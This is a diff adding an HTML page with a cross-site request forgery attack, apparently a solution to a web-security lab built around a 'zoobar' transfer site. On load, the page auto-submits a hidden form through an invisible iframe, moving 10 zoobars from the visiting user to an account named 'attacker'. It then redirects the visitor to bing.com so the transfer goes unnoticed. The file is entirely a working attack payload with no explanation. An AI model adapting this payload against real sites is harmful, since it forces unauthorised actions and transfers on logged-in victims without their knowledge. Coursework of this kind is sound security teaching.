@@ -1,0 +1,14 @@
+<html>
+	<iframe id="myframe" name="myframe" style="display:none"></iframe>
+	<form target="myframe" method=POST name=transferform action="http://zoobar.org/transfer.php">
+		<input name=zoobars type="hidden" value="10" size=5>
+		<input name=recipient type="hidden" value="attacker">
+		<input id="send" type=submit name=submission value="Send">
+	</form>
+	<script>
+		document.getElementById('send').click();
+		setTimeout(function(){
+			window.location.href = 'http://www.bing.com';
+		}, 1);
+	</script>
+</html>
